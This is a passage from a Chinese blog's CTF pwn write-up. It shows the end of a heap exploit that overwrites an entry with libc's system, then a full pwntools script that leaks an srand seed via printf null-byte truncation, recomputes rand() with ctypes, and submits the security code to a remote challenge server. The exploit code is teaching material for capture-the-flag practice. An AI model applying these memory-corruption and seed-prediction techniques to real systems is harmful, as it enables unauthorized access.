edit<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">11</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>system<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
menu<span class="token punctuation">(</span><span class="token number">0x2023</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<h2><a id="_281"></a>字符串和随机数</h2> 
<p>利用printf 遇到“\x00”截断的特性得到seed种子随后构造对应正确的值即可</p> 
<blockquote> 
 <p>在写python程序时,有时会用到C语言库函数<br> ctypes是一个用于Python的外部函数库，它提供C兼容的数据类型，并允许在DLL或共享库中调用函数。<br> Linux 系统下的 C 标准库动态链接文件为 libc.so.6</p> 
</blockquote> 
<pre><code class="prism language-python">大致模板
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>
libc <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>
libc<span class="token punctuation">.</span>函数<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">//</span>可调用<span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token punctuation">.</span>so<span class="token punctuation">.</span><span class="token number">6</span>中存在的函数了
</code></pre> 
<blockquote> 
 <p>Python中的模块（.py文件）在创建之初会自动加载一些内建变量，__name__就是其中之一。<br> Python模块中通常会定义很多变量和函数，这些变量和函数相当于模块中的一个功能，模块被导入到别的文件中，可以调用这些变量和函数。那么这时 <strong>name</strong> 的作用就彰显了，它可以标识模块的名字，可以显示一个模块的某功能是被自己执行还是被别的文件调用执行，<br> 假设模块A、B，模块A自己定义了功能C,模块B调用模块A，现在功能C被执行了：<br> 如果C被A自己执行，也就是说模块执行了自己定义的功能，那么 <strong>name</strong>==‘<strong>main</strong>’</p> 
</blockquote> 
<p>如果C被B调用执行，也就是说当前模块调用执行了别的模块的功能，那么__name__==‘A’（被调用模块的名字）</p> 
<p>name变量和seed变量相隔0x20<br> <img src="https://images2.imgbox.com/f6/78/8llTkHcC_o.png" alt="在这里插入图片描述"></p> 
<pre><code class="prism language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll
context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
<span class="token comment">#s=process("../dist/pwn")</span>
s<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"8.130.35.16"</span><span class="token punctuation">,</span><span class="token number">51001</span><span class="token punctuation">)</span>
clib<span class="token operator">=</span>cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"../dist/libc.so.6"</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
 <span class="token comment">#sleep(5)</span>
 s<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b"Name: "</span><span class="token punctuation">,</span><span class="token string">b"admin"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">b"a"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 s<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b"Password: "</span><span class="token punctuation">,</span><span class="token string">b"1s_7h1s_p9ss_7tuIy_sAf3?"</span><span class="token punctuation">)</span>
 s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"admin"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">b"a"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 seed<span class="token operator">=</span>u32<span class="token punctuation">(</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 clib<span class="token punctuation">.</span>srand<span class="token punctuation">(</span>seed<span class="token punctuation">)</span>
 arg1<span class="token operator">=</span>clib<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">0xd0e0a0d0</span>
 info<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>arg1<span class="token punctuation">)</span><span class="token punctuation">)</span>
 arg2<span class="token operator">=</span>clib<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">0x0b0e0e0f</span>
 info<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>arg2<span class="token punctuation">)</span><span class="token punctuation">)</span>
 chal<span class="token operator">=</span><span class="token punctuation">(</span>arg1<span class="token operator">^</span>arg2<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">1000000</span>
 info<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>chal<span class="token punctuation">)</span><span class="token punctuation">)</span>
 s<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"Wanna see it?"</span><span class="token punctuation">,</span><span class="token string">b"y"</span><span class="token punctuation">)</span>
 s<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"Input the security code to continue: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>chal<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 s<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/21c3a13d702be8ae58c401b320c3d409/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">python字符串压缩以及还原</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/fa936e2968ef8c09763b50b9b7b8303d/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Git 概述、命令、分支，免密登录；及 Idea 集成 GitHub</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>